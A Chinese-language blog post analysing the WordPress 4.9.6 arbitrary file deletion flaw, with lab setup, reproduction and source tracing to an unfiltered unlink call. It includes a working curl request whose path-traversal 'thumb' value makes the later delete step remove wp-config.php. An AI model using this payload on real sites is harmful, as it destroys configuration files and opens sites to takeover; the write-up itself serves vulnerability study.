<!DOCTYPE html>
<html lang="en">

<head>
    
<meta charset="utf-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">


<title>Wordpress 4.9.6 Arbitrary File-Removal Vulnerability - F0rmat的博客 | 专注于网络攻防和信息安全</title>

<meta name="description" content="0x01 前言 和预期超了几天，毕业了挺多聚会的，在学校的日子总是过得那么快，一转眼就毕业了。好些东西都没去好好珍惜，大学也不要求有多大的成就，就希望每天都能开开心心就最好的。 今天这篇文章的分析早就有人发过了，不过我觉得我还是得写一下，毕竟我要有我自己的风格。还是老样子，先测试漏洞怎么触发，然后再去做分析。
0x02 环境搭建 旧的和新的区别不大，只要不大于4.9.6就行了，这次测试的是4.6版本的，具体怎么搭建按照上一篇的文章方法搭建就行了，这里就不再过一遍了。 https://getpass.cn/2018/06/18/Analysis-of-WordPress%3C=4.6-Command-Execution-Vulnerability/
本文中用的搭建环境是docker&#43;Kitematic，都差不多的，用图形界面比较方便些。 0x03 漏洞复现 1.漏洞执行流程 先给一个大概的框架，代码稍后再分析就会很明了了。 2.复现过程 -登录账号 -上传文件 -编辑文件 -执行Payload 首先要获取_wpnonce和cookies还有post的id。 然后执行： curl -v &#39;http://127.0.0.1/wp-admin/post.php?post=5&#39; -H &#39;Cookie: xxx&#39; -d &#39;action=editattachment&amp;amp;_wpnonce=xxx&amp;amp;thumb=../../../../wp-config.php&#39; 我这里用的是curl，在Macos比较方便，如果是win可以用抓包发包。 -删除文件 然后点击删除 执行完之后会跳转到安装界面。 然后wp-config.php也不在网站目录下了 0x04 漏洞分析 1.phpmyadmin安装 在命令行里面看数据不太好看，装个图形界面比较清楚，进入docker的交互式： 查看容器ID docker ps 进入指定容器的交互式 docker exec -it ID /bin/bash 安装phpmyadmin,输入下面的命令就行了： apt update apt install phpmyadmin 然后输入MySQL的账号密码，再创建链接： ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin 最后输入 htpp://127.0.0.1/phpmyadmin进入
2.分析如何插入thumb属性 我们看下Payload里面是传了什么参数：
 post action thumb  post传入的ID就不分析了，直接看action的参数的值是editattachment,代码是在/wp-admin/post.php的178~189行
case &amp;#39;editattachment&amp;#39;: check_admin_referer(&amp;#39;update-post_&amp;#39; ." /><meta name="keywords"
  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
  <meta name="referrer" content="no-referrer" />


<link rel="stylesheet" href="https://getshe11.com/css/main.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">



<meta property="og:title" content="Wordpress 4.9.6 Arbitrary File-Removal Vulnerability" />
<meta property="og:description" content="0x01 前言 和预期超了几天，毕业了挺多聚会的，在学校的日子总是过得那么快，一转眼就毕业了。好些东西都没去好好珍惜，大学也不要求有多大的成就，就希望每天都能开开心心就最好的。 今天这篇文章的分析早就有人发过了，不过我觉得我还是得写一下，毕竟我要有我自己的风格。还是老样子，先测试漏洞怎么触发，然后再去做分析。
0x02 环境搭建 旧的和新的区别不大，只要不大于4.9.6就行了，这次测试的是4.6版本的，具体怎么搭建按照上一篇的文章方法搭建就行了，这里就不再过一遍了。 https://getpass.cn/2018/06/18/Analysis-of-WordPress%3C=4.6-Command-Execution-Vulnerability/
本文中用的搭建环境是docker&#43;Kitematic，都差不多的，用图形界面比较方便些。 0x03 漏洞复现 1.漏洞执行流程 先给一个大概的框架，代码稍后再分析就会很明了了。 2.复现过程 -登录账号 -上传文件 -编辑文件 -执行Payload 首先要获取_wpnonce和cookies还有post的id。 然后执行： curl -v &#39;http://127.0.0.1/wp-admin/post.php?post=5&#39; -H &#39;Cookie: xxx&#39; -d &#39;action=editattachment&amp;_wpnonce=xxx&amp;thumb=../../../../wp-config.php&#39; 我这里用的是curl，在Macos比较方便，如果是win可以用抓包发包。 -删除文件 然后点击删除 执行完之后会跳转到安装界面。 然后wp-config.php也不在网站目录下了 0x04 漏洞分析 1.phpmyadmin安装 在命令行里面看数据不太好看，装个图形界面比较清楚，进入docker的交互式： 查看容器ID docker ps 进入指定容器的交互式 docker exec -it ID /bin/bash 安装phpmyadmin,输入下面的命令就行了： apt update apt install phpmyadmin 然后输入MySQL的账号密码，再创建链接： ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin 最后输入 htpp://127.0.0.1/phpmyadmin进入
2.分析如何插入thumb属性 我们看下Payload里面是传了什么参数：
 post action thumb  post传入的ID就不分析了，直接看action的参数的值是editattachment,代码是在/wp-admin/post.php的178~189行
case &#39;editattachment&#39;: check_admin_referer(&#39;update-post_&#39; ." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://getshe11.com/post/wordpress-4.9.6-arbitrary-file-removal-vulnerability/" />
<meta property="article:published_time" content="2018-07-01T10:07:19+00:00" />
<meta property="article:modified_time" content="2018-07-01T10:07:19+00:00" />
<meta itemprop="name" content="Wordpress 4.9.6 Arbitrary File-Removal Vulnerability">
<meta itemprop="description" content="0x01 前言 和预期超了几天，毕业了挺多聚会的，在学校的日子总是过得那么快，一转眼就毕业了。好些东西都没去好好珍惜，大学也不要求有多大的成就，就希望每天都能开开心心就最好的。 今天这篇文章的分析早就有人发过了，不过我觉得我还是得写一下，毕竟我要有我自己的风格。还是老样子，先测试漏洞怎么触发，然后再去做分析。
0x02 环境搭建 旧的和新的区别不大，只要不大于4.9.6就行了，这次测试的是4.6版本的，具体怎么搭建按照上一篇的文章方法搭建就行了，这里就不再过一遍了。 https://getpass.cn/2018/06/18/Analysis-of-WordPress%3C=4.6-Command-Execution-Vulnerability/
本文中用的搭建环境是docker&#43;Kitematic，都差不多的，用图形界面比较方便些。 0x03 漏洞复现 1.漏洞执行流程 先给一个大概的框架，代码稍后再分析就会很明了了。 2.复现过程 -登录账号 -上传文件 -编辑文件 -执行Payload 首先要获取_wpnonce和cookies还有post的id。 然后执行： curl -v &#39;http://127.0.0.1/wp-admin/post.php?post=5&#39; -H &#39;Cookie: xxx&#39; -d &#39;action=editattachment&amp;_wpnonce=xxx&amp;thumb=../../../../wp-config.php&#39; 我这里用的是curl，在Macos比较方便，如果是win可以用抓包发包。 -删除文件 然后点击删除 执行完之后会跳转到安装界面。 然后wp-config.php也不在网站目录下了 0x04 漏洞分析 1.phpmyadmin安装 在命令行里面看数据不太好看，装个图形界面比较清楚，进入docker的交互式： 查看容器ID docker ps 进入指定容器的交互式 docker exec -it ID /bin/bash 安装phpmyadmin,输入下面的命令就行了： apt update apt install phpmyadmin 然后输入MySQL的账号密码，再创建链接： ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin 最后输入 htpp://127.0.0.1/phpmyadmin进入
2.分析如何插入thumb属性 我们看下Payload里面是传了什么参数：
 post action thumb  post传入的ID就不分析了，直接看action的参数的值是editattachment,代码是在/wp-admin/post.php的178~189行
case &#39;editattachment&#39;: check_admin_referer(&#39;update-post_&#39; .">
<meta itemprop="datePublished" content="2018-07-01T10:07:19+00:00" />
<meta itemprop="dateModified" content="2018-07-01T10:07:19+00:00" />
<meta itemprop="wordCount" content="384">



<meta itemprop="keywords" content="WordPress," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Wordpress 4.9.6 Arbitrary File-Removal Vulnerability"/>
<meta name="twitter:description" content="0x01 前言 和预期超了几天，毕业了挺多聚会的，在学校的日子总是过得那么快，一转眼就毕业了。好些东西都没去好好珍惜，大学也不要求有多大的成就，就希望每天都能开开心心就最好的。 今天这篇文章的分析早就有人发过了，不过我觉得我还是得写一下，毕竟我要有我自己的风格。还是老样子，先测试漏洞怎么触发，然后再去做分析。
0x02 环境搭建 旧的和新的区别不大，只要不大于4.9.6就行了，这次测试的是4.6版本的，具体怎么搭建按照上一篇的文章方法搭建就行了，这里就不再过一遍了。 https://getpass.cn/2018/06/18/Analysis-of-WordPress%3C=4.6-Command-Execution-Vulnerability/
本文中用的搭建环境是docker&#43;Kitematic，都差不多的，用图形界面比较方便些。 0x03 漏洞复现 1.漏洞执行流程 先给一个大概的框架，代码稍后再分析就会很明了了。 2.复现过程 -登录账号 -上传文件 -编辑文件 -执行Payload 首先要获取_wpnonce和cookies还有post的id。 然后执行： curl -v &#39;http://127.0.0.1/wp-admin/post.php?post=5&#39; -H &#39;Cookie: xxx&#39; -d &#39;action=editattachment&amp;_wpnonce=xxx&amp;thumb=../../../../wp-config.php&#39; 我这里用的是curl，在Macos比较方便，如果是win可以用抓包发包。 -删除文件 然后点击删除 执行完之后会跳转到安装界面。 然后wp-config.php也不在网站目录下了 0x04 漏洞分析 1.phpmyadmin安装 在命令行里面看数据不太好看，装个图形界面比较清楚，进入docker的交互式： 查看容器ID docker ps 进入指定容器的交互式 docker exec -it ID /bin/bash 安装phpmyadmin,输入下面的命令就行了： apt update apt install phpmyadmin 然后输入MySQL的账号密码，再创建链接： ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin 最后输入 htpp://127.0.0.1/phpmyadmin进入
2.分析如何插入thumb属性 我们看下Payload里面是传了什么参数：
 post action thumb  post传入的ID就不分析了，直接看action的参数的值是editattachment,代码是在/wp-admin/post.php的178~189行
case &#39;editattachment&#39;: check_admin_referer(&#39;update-post_&#39; ."/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->
</head>

<body>
    <div class="header-placeholder"></div>
    
    <header class="header">
        <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    
    <a class="site-title" href="https://getshe11.com/">F0rmat</a>
    
    <nav class="site-nav">
        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
    </nav>
</div>

    </header>

    
    <div class="page-content">
        <div class="wrapper">
            
            <div class="col-main">
                <div class="post">
    
    <header class="post-header">
        <h1 class="post-title">Wordpress 4.9.6 Arbitrary File-Removal Vulnerability</h1>
        <p class="post-meta">Jul 01, 2018</p>
    </header>
    <article class="post-content">
        
        
        
        
        
        
        <h1 id="0x01-前言">0x01 前言</h1>
<p>和预期超了几天，毕业了挺多聚会的，在学校的日子总是过得那么快，一转眼就毕业了。好些东西都没去好好珍惜，大学也不要求有多大的成就，就希望每天都能开开心心就最好的。
今天这篇文章的分析早就有人发过了，不过我觉得我还是得写一下，毕竟我要有我自己的风格。还是老样子，先测试漏洞怎么触发，然后再去做分析。</p>
<h1 id="0x02-环境搭建">0x02 环境搭建</h1>
<p>旧的和新的区别不大，只要不大于4.9.6就行了，这次测试的是4.6版本的，具体怎么搭建按照上一篇的文章方法搭建就行了，这里就不再过一遍了。
<a href="https://getpass.cn/2018/06/18/Analysis-of-WordPress%3C=4.6-Command-Execution-Vulnerability/">https://getpass.cn/2018/06/18/Analysis-of-WordPress%3C=4.6-Command-Execution-Vulnerability/</a></p>
<p>本文中用的搭建环境是docker+Kitematic，都差不多的，用图形界面比较方便些。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Wordpress-detele/4.png" alt=""></p>
<h1 id="0x03-漏洞复现">0x03 漏洞复现</h1>
<h2 id="1漏洞执行流程">1.漏洞执行流程</h2>
<p>先给一个大概的框架，代码稍后再分析就会很明了了。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Wordpress-detele/11.png" alt=""></p>
<!-- raw HTML omitted -->
<h2 id="2复现过程">2.复现过程</h2>
<h3 id="-登录账号">-登录账号</h3>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Wordpress-detele/1.png" alt=""></p>
<h3 id="-上传文件">-上传文件</h3>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Wordpress-detele/2.png" alt=""></p>
<h3 id="-编辑文件">-编辑文件</h3>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Wordpress-detele/3.png" alt=""></p>
<h3 id="-执行payload">-执行Payload</h3>
<p>首先要获取<code>_wpnonce</code>和<code>cookies</code>还有post的<code>id</code>。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Wordpress-detele/5.png" alt="">
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Wordpress-detele/6.png" alt="">
然后执行：
<code>curl -v 'http://127.0.0.1/wp-admin/post.php?post=5' -H 'Cookie: xxx' -d 'action=editattachment&amp;_wpnonce=xxx&amp;thumb=../../../../wp-config.php'</code>
我这里用的是curl，在Macos比较方便，如果是win可以用抓包发包。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Wordpress-detele/7.png" alt=""></p>
<h3 id="-删除文件">-删除文件</h3>
<p>然后点击删除
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Wordpress-detele/8.png" alt=""></p>
<p>执行完之后会跳转到安装界面。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Wordpress-detele/9.png" alt="">
然后<code>wp-config.php</code>也不在网站目录下了
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Wordpress-detele/10.png" alt=""></p>
<h1 id="0x04-漏洞分析">0x04 漏洞分析</h1>
<h2 id="1phpmyadmin安装">1.phpmyadmin安装</h2>
<p>在命令行里面看数据不太好看，装个图形界面比较清楚，进入docker的交互式：
查看容器ID
<code>docker ps</code>
进入指定容器的交互式
<code>docker exec -it ID /bin/bash</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Wordpress-detele/12.png" alt="">
安装phpmyadmin,输入下面的命令就行了：
<code>apt update</code>
<code>apt install phpmyadmin</code>
然后输入MySQL的账号密码，再创建链接：
<code>ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin</code>
最后输入
<code>htpp://127.0.0.1/phpmyadmin</code>进入</p>
<h2 id="2分析如何插入thumb属性">2.分析如何插入thumb属性</h2>
<p>我们看下Payload里面是传了什么参数：</p>
<ul>
<li>post</li>
<li>action</li>
<li>thumb</li>
</ul>
<p>post传入的ID就不分析了，直接看<code>action</code>的参数的值是<code>editattachment</code>,代码是在<code>/wp-admin/post.php</code>的178~189行</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">case</span> <span class="s1">&#39;editattachment&#39;</span><span class="o">:</span>
	<span class="nx">check_admin_referer</span><span class="p">(</span><span class="s1">&#39;update-post_&#39;</span> <span class="o">.</span> <span class="nv">$post_id</span><span class="p">);</span>

	<span class="c1">// Don&#39;t let these be changed
</span><span class="c1"></span>	<span class="nx">unset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;guid&#39;</span><span class="p">]);</span>
	<span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;post_type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;attachment&#39;</span><span class="p">;</span>

	<span class="c1">// Update the thumbnail filename
</span><span class="c1"></span>	<span class="nv">$newmeta</span> <span class="o">=</span> <span class="nx">wp_get_attachment_metadata</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="k">true</span> <span class="p">);</span>
    <span class="c1">//这里把POST过来的thumb赋值给newmeta数值里面的thumb
</span><span class="c1"></span>	<span class="nv">$newmeta</span><span class="p">[</span><span class="s1">&#39;thumb&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;thumb&#39;</span><span class="p">];</span>
    <span class="c1">//执行update函数
</span><span class="c1"></span>	<span class="nx">wp_update_attachment_metadata</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="nv">$newmeta</span> <span class="p">);</span>
</code></pre></div><p>我们继续跟进<code>wp_update_attachment_metadata</code>函数，在<code>/wp-includes/post.php</code>文件的5079~5097行：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">wp_update_attachment_metadata</span><span class="p">(</span> <span class="nv">$attachment_id</span><span class="p">,</span> <span class="nv">$data</span> <span class="p">)</span> <span class="p">{</span>
	<span class="nv">$attachment_id</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$attachment_id</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$post</span> <span class="o">=</span> <span class="nx">get_post</span><span class="p">(</span> <span class="nv">$attachment_id</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="k">false</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span> <span class="nv">$data</span> <span class="o">=</span> <span class="nx">apply_filters</span><span class="p">(</span> <span class="s1">&#39;wp_update_attachment_metadata&#39;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$post</span><span class="o">-&gt;</span><span class="na">ID</span> <span class="p">)</span> <span class="p">)</span>
		<span class="k">return</span> <span class="nx">update_post_meta</span><span class="p">(</span> <span class="nv">$post</span><span class="o">-&gt;</span><span class="na">ID</span><span class="p">,</span> <span class="s1">&#39;_wp_attachment_metadata&#39;</span><span class="p">,</span> <span class="nv">$data</span> <span class="p">);</span>
	<span class="k">else</span>
		<span class="k">return</span> <span class="nx">delete_post_meta</span><span class="p">(</span> <span class="nv">$post</span><span class="o">-&gt;</span><span class="na">ID</span><span class="p">,</span> <span class="s1">&#39;_wp_attachment_metadata&#39;</span> <span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>上面一些函数过滤的可以直接去读一下，对插入这个值是没什么影响的，记住传入的<code>$meta_key</code>的值是<code>_wp_attachment_metadata</code>我们继续跟进函数<code>update_post_meta</code>,</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$updated</span> <span class="o">=</span> <span class="nx">update_metadata</span><span class="p">(</span> <span class="s1">&#39;post&#39;</span><span class="p">,</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="nv">$meta_key</span><span class="p">,</span> <span class="nv">$meta_value</span><span class="p">,</span> <span class="nv">$prev_value</span> <span class="p">);</span>
</code></pre></div><p>这个函数没什么好分析的，我们继续跟进这个函数里面的<code>update_metadata</code>函数的202行:</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">	<span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$meta_ids</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="nx">add_metadata</span><span class="p">(</span> <span class="nv">$meta_type</span><span class="p">,</span> <span class="nv">$object_id</span><span class="p">,</span> <span class="nv">$raw_meta_key</span><span class="p">,</span> <span class="nv">$passed_value</span> <span class="p">);</span>
	<span class="p">}</span>
</code></pre></div><p>继续跟进<code>add_metadata</code>函数，前面都是序列化操作和过滤操作，主要看96~100行的插入sql执行语句：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">	<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">(</span> <span class="nv">$table</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
		<span class="nv">$column</span> <span class="o">=&gt;</span> <span class="nv">$object_id</span><span class="p">,</span>
		<span class="s1">&#39;meta_key&#39;</span> <span class="o">=&gt;</span> <span class="nv">$meta_key</span><span class="p">,</span>
		<span class="s1">&#39;meta_value&#39;</span> <span class="o">=&gt;</span> <span class="nv">$meta_value</span>
	<span class="p">)</span> <span class="p">);</span>
</code></pre></div><p>我们来实现这个代码的执行流程，我们再次上传图片，然后执行Payload。</p>
<p>执行前的<code>wp_postmeta</code>表<code>_wp_attachment_metadata</code>字段内容：
可以复制内容到https://1024tools.com/unserialize       网站，也可以用浏览器插件
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Wordpress-detele/13.png" alt="">
执行后：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Wordpress-detele/14.png" alt="">
可以看出已经成功插入thumb的内容了。</p>
<h2 id="3分析任意文件删除">3.分析任意文件删除</h2>
<p>还是从文件<code>/wp-admin/post.php</code>开始分析，找到action是delete的case地方，在246~2268行,它这里判断了<code>post_type</code>是否等于<code>attachment</code>，这个在上面插入的那个函数里面已经赋值了，可以回去看下183行。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">case</span> <span class="s1">&#39;delete&#39;</span><span class="o">:</span>
	<span class="nx">check_admin_referer</span><span class="p">(</span><span class="s1">&#39;delete-post_&#39;</span> <span class="o">.</span> <span class="nv">$post_id</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$post</span> <span class="p">)</span>
		<span class="nx">wp_die</span><span class="p">(</span> <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;This item has already been deleted.&#39;</span> <span class="p">)</span> <span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$post_type_object</span> <span class="p">)</span>
		<span class="nx">wp_die</span><span class="p">(</span> <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;Invalid post type.&#39;</span> <span class="p">)</span> <span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">current_user_can</span><span class="p">(</span> <span class="s1">&#39;delete_post&#39;</span><span class="p">,</span> <span class="nv">$post_id</span> <span class="p">)</span> <span class="p">)</span>
		<span class="nx">wp_die</span><span class="p">(</span> <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;Sorry, you are not allowed to delete this item.&#39;</span> <span class="p">)</span> <span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span> <span class="nv">$post</span><span class="o">-&gt;</span><span class="na">post_type</span> <span class="o">==</span> <span class="s1">&#39;attachment&#39;</span> <span class="p">)</span> <span class="p">{</span>
		<span class="nv">$force</span> <span class="o">=</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">MEDIA_TRASH</span> <span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">wp_delete_attachment</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="nv">$force</span> <span class="p">)</span> <span class="p">)</span>
			<span class="nx">wp_die</span><span class="p">(</span> <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;Error in deleting.&#39;</span> <span class="p">)</span> <span class="p">);</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">wp_delete_post</span><span class="p">(</span> <span class="nv">$post_id</span><span class="p">,</span> <span class="k">true</span> <span class="p">)</span> <span class="p">)</span>
			<span class="nx">wp_die</span><span class="p">(</span> <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;Error in deleting.&#39;</span> <span class="p">)</span> <span class="p">);</span>
	<span class="p">}</span>

	<span class="nx">wp_redirect</span><span class="p">(</span> <span class="nx">add_query_arg</span><span class="p">(</span><span class="s1">&#39;deleted&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nv">$sendback</span><span class="p">)</span> <span class="p">);</span>
	<span class="k">exit</span><span class="p">();</span>
</code></pre></div><p>我们继续跟进<code>wp_delete_attachment</code>函数，在<code>wp-includes/post.php</code>的5002~5010行,可以看到执行sql语句查询出来的<code>$meta['thumb']</code>的值，然后下面也没过滤直接就带入了<code>unlink</code>函数，而且通过上面的分析<code>$meta['thumb']</code>的值是可控的，这样就造成了任意文件的删除。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">	<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$meta</span><span class="p">[</span><span class="s1">&#39;thumb&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
		<span class="c1">// Don&#39;t delete the thumb if another attachment uses it.
</span><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">get_row</span><span class="p">(</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span> <span class="s2">&#34;SELECT meta_id FROM </span><span class="si">$wpdb-&gt;postmeta</span><span class="s2"> WHERE meta_key = &#39;_wp_attachment_metadata&#39; AND meta_value LIKE %s AND post_id &lt;&gt; %d&#34;</span><span class="p">,</span> <span class="s1">&#39;%&#39;</span> <span class="o">.</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">esc_like</span><span class="p">(</span> <span class="nv">$meta</span><span class="p">[</span><span class="s1">&#39;thumb&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;%&#39;</span><span class="p">,</span> <span class="nv">$post_id</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nv">$thumbfile</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nx">basename</span><span class="p">(</span><span class="nv">$file</span><span class="p">),</span> <span class="nv">$meta</span><span class="p">[</span><span class="s1">&#39;thumb&#39;</span><span class="p">],</span> <span class="nv">$file</span><span class="p">);</span>
			<span class="sd">/** This filter is documented in wp-includes/functions.php */</span>
			<span class="nv">$thumbfile</span> <span class="o">=</span> <span class="nx">apply_filters</span><span class="p">(</span> <span class="s1">&#39;wp_delete_file&#39;</span><span class="p">,</span> <span class="nv">$thumbfile</span> <span class="p">);</span>
			<span class="o">@</span> <span class="nx">unlink</span><span class="p">(</span> <span class="nx">path_join</span><span class="p">(</span><span class="nv">$uploadpath</span><span class="p">[</span><span class="s1">&#39;basedir&#39;</span><span class="p">],</span> <span class="nv">$thumbfile</span><span class="p">)</span> <span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
</code></pre></div><h1 id="0x05-结束">0x05 结束</h1>
<p>写这个文章写到一半忘了保存又重新写了一遍，心累。。。</p>
<h1 id="0x06-参考">0x06 参考</h1>
<p><a href="https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/">https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/</a>
<a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/">https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</a>
<a href="https://1024tools.com/unserialize">https://1024tools.com/unserialize</a></p>

    </article>

    
    <div class="prevnext">
        



<ul class="prevnext">
    
    <li>上一篇：
        <a href="https://getshe11.com/post/analysis-of-wordpress4.6-command-execution-vulnerability/">
            WordPress 4.6 Command Execution Vulnerability(CVE-2016-10033) Analysis
        </a>
    </li>
    
    
    <li>下一篇：
        <a href="https://getshe11.com/post/hdwiki-v6.0_latest_version_of_referer_injection_vulnerability/">
            HDWiki V6.0最新版referer注入漏洞(每周一洞)
        </a>
    </li>
    
</ul>

    </div>
    
    <div class="post-comments">
        
  
  

  
    <script src="https://utteranc.es/client.js"
            repo="F0r3at/Getshe11.com"
            issue-term="pathname"
            theme="github-light"
            crossorigin="anonymous"
            async>
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>

    </div>
</div>
            </div>
            
            <div class="col-second">
                <div class="col-box col-box-author">
    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
    <div class="col-box-title name">F0rmat</div>
    <p>Stay Hungry, Stay Foolish.</p>
    <p class="contact">
        <a href="http://github.com/F0r3at">Github</a>
    </p>
</div>

<div class="col-box">
    <div class="col-box-title">Newest Posts</div>
    <ul class="post-list">
        
        <li>
            <a href="https://getshe11.com/post/research-on-gitlab-cookie-deserialization-vulnerability/" class="post-link">Gitlab Cookie 反序列化漏洞研究</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/kali-install-clash/" class="post-link">Kali Linux安装Clash</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
        </li>
        
    </ul>
</div>

<div class="col-box post-toc hide">
